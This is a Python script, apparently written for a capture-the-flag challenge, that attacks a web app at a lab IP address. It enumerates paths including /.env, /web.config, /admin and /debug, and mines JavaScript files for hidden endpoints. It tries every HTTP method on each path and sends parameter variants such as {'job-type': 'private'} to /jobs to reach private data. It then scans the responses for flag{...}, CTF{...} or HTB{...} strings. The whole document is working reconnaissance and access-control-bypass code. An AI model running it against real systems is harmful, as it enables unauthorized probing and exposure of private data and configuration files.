import requests
import re
from urllib.parse import urljoin

TARGET = "http://10.0.162.112:80"

PATHS = [
    "/", "/index.html", "/login", "/register", "/api", "/api/v1",
    "/jobs", "/jobs/", "/job", "/job/", "/api/jobs", "/api/job",
    "/admin", "/dashboard", "/panel", "/search", "/query",
    "/users", "/user", "/profile", "/config", "/settings",
    "/private", "/api/private", "/jobs/private", "/api/jobs/private",
    "/job-type", "/job-types", "/api/job-types", "/types",
    "/submit", "/apply", "/create", "/add", "/delete", "/update",
    "/flag", "/secret", "/hidden", "/debug", "/status", "/health",
    "/swagger", "/api-docs", "/openapi.json", "/graphql",
    "/robots.txt", "/sitemap.xml", "/.env", "/web.config",
    "/static/js/app.js", "/static/js/main.js", "/js/app.js",
    "/static/js/index.js", "/bundle.js", "/app.js", "/main.js",
]

METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

JS_PATTERNS = [
    r'fetch\s*\(\s*["\']([^"\']+)["\']',
    r'axios\.\w+\s*\(\s*["\']([^"\']+)["\']',
    r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
    r'["\'](/api/[^"\']+)["\']',
    r'["\'](/jobs[^"\']*)["\']',
    r'["\'](/private[^"\']*)["\']',
    r'action\s*=\s*["\']([^"\']+)["\']',
    r'href\s*=\s*["\']([^"\']+)["\']',
    r'src\s*=\s*["\']([^"\']*\.js[^"\']*)["\']',
    r'["\'](/[^"\']{2,})["\']',
]

def extract_endpoints_from_text(text):
    found = set()
    for pattern in JS_PATTERNS:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for m in matches:
            m = m.strip()
            if m and not m.startswith('http') and not m.startswith('//'):
                found.add(m)
            elif m.startswith('http') and TARGET in m:
                found.add(m.replace(TARGET, ''))
    return found

def main():
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })

    discovered_endpoints = set()
    js_files = set()

    # Step 1: Fetch main page
    print("[*] Fetching main page...")
    try:
        r = session.get(TARGET + "/")
        print(f"    Status: {r.status_code}")
        print(f"    Content-Length: {len(r.text)}")

        endpoints = extract_endpoints_from_text(r.text)
        discovered_endpoints.update(endpoints)

        # Extract JS file paths
        js_matches = re.findall(r'src\s*=\s*["\']([^"\']*\.js[^"\']*)["\']', r.text)
        js_files.update(js_matches)

        # Extract inline script content
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
        for script in inline_scripts:
            eps = extract_endpoints_from_text(script)
            discovered_endpoints.update(eps)

        print(f"    Found {len(endpoints)} endpoints from HTML")
        print(f"    Found {len(js_files)} JS files")
        for ep in sorted(endpoints):
            print(f"      - {ep}")
    except Exception as e:
        print(f"    Error: {e}")

    # Step 2: Fetch and analyze JS files
    print("\n[*] Analyzing JavaScript files...")
    for js_file in js_files:
        js_url = urljoin(TARGET, js_file)
        print(f"    Fetching: {js_url}")
        try:
            r = session.get(js_url)
            if r.status_code == 200:
                endpoints = extract_endpoints_from_text(r.text)
                discovered_endpoints.update(endpoints)
                print(f"      Status: {r.status_code}, Found {len(endpoints)} endpoints")
                for ep in sorted(endpoints):
                    print(f"        - {ep}")

                # Look for method hints in JS
                method_patterns = re.findall(r'method\s*:\s*["\'](\w+)["\']', r.text)
                if method_patterns:
                    print(f"        Methods found: {set(method_patterns)}")
        except Exception as e:
            print(f"      Error: {e}")

    # Step 3: Combine all paths
    all_paths = set(PATHS) | discovered_endpoints
    print(f"\n[*] Total paths to test: {len(all_paths)}")

    # Step 4: Enumerate endpoints with different methods
    print("\n[*] Enumerating endpoints...")
    valid_endpoints = {}

    for path in sorted(all_paths):
        url = urljoin(TARGET, path)
        method_results = {}

        for method in METHODS:
            try:
                if method in ["GET", "HEAD", "OPTIONS"]:
                    r = session.request(method, url, timeout=5)
                else:
                    r = session.request(method, url, json={"job-type": "private"}, timeout=5)

                if r.status_code not in [404, 405, 501, 502, 503]:
                    method_results[method] = r.status_code

                    if r.status_code == 200 and method not in ["HEAD", "OPTIONS"]:
                        snippet = r.text[:200].replace('\n', ' ').strip()
                        if snippet:
                            print(f"    [{method}] {path} -> {r.status_code}: {snippet[:100]}")
                        else:
                            print(f"    [{method}] {path} -> {r.status_code}: (empty)")

                        # Check for flag
                        flag_match = re.search(r'flag\{[^}]+\}|CTF\{[^}]+\}|HTB\{[^}]+\}', r.text)
                        if flag_match:
                            print(f"\n    [!!!] FLAG FOUND: {flag_match.group()}")

                elif r.status_code == 405:
                    if method not in method_results:
                        method_results[method] = r.status_code

            except requests.exceptions.RequestException:
                pass

        if method_results:
            valid_endpoints[path] = method_results
            allowed = [f"{m}={s}" for m, s in method_results.items()]
            print(f"  {path}: {', '.join(allowed)}")

    # Step 5: Deep test on /jobs with different methods and payloads
    print("\n[*] Deep testing /jobs endpoint...")
    jobs_payloads = [
        {"job-type": "private"},
        {"job-type": "public"},
        {"type": "private"},
        {"job_type": "private"},
        {"jobType": "private"},
        {"job-type": "private", "id": 1},
        {"private": True},
        {"type": "private", "action": "list"},
    ]

    for method in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
        for payload in jobs_payloads:
            try:
                url = urljoin(TARGET, "/jobs")
                if method == "GET":
                    r = session.request(method, url, params=payload, timeout=5)
                else:
                    r = session.request(method, url, json=payload, timeout=5)

                if r.status_code not in [404, 405]:
                    print(f"    [{method}] /jobs payload={payload} -> {r.status_code}: {r.text[:150]}")
            except:
                pass

        # Also try form-encoded
        try:
            url = urljoin(TARGET, "/jobs")
            r = session.request(method, url, data={"job-type": "private"}, timeout=5)
            if r.status_code not in [404, 405]:
                print(f"    [{method}] /jobs (form) -> {r.status_code}: {r.text[:150]}")
        except:
            pass

    # Step 6: Try /jobs with path variations
    print("\n[*] Testing /jobs path variations...")
    jobs_paths = [
        "/jobs/private", "/jobs/list", "/jobs/search", "/jobs/1",
        "/jobs/create", "/jobs/submit", "/jobs/apply",
        "/api/jobs", "/api/jobs/private", "/api/jobs/list",
        "/api/v1/jobs", "/api/v1/jobs/private",
        "/private/jobs", "/job/private",
    ]

    for path in jobs_paths:
        url = urljoin(TARGET, path)
        for method in ["GET", "POST"]:
            try:
                if method == "GET":
                    r = session.request(method, url, timeout=5)
                else:
                    r = session.request(method, url, json={"job-type": "private"}, timeout=5)

                if r.status_code not in [404, 405, 502, 503]:
                    print(f"    [{method}] {path} -> {r.status_code}: {r.text[:150]}")
                    flag_match = re.search(r'flag\{[^}]+\}|CTF\{[^}]+\}|HTB\{[^}]+\}', r.text)
                    if flag_match:
                        print(f"\n    [!!!] FLAG FOUND: {flag_match.group()}")
            except:
                pass

    # Summary
    print("\n" + "="*60)
    print("[*] SUMMARY - Valid Endpoints:")
    print("="*60)
    for path, methods in sorted(valid_endpoints.items()):
        allowed = [f"{m}={s}" for m, s in methods.items()]
        print(f"  {path}: {', '.join(allowed)}")

if __name__ == "__main__":
    main()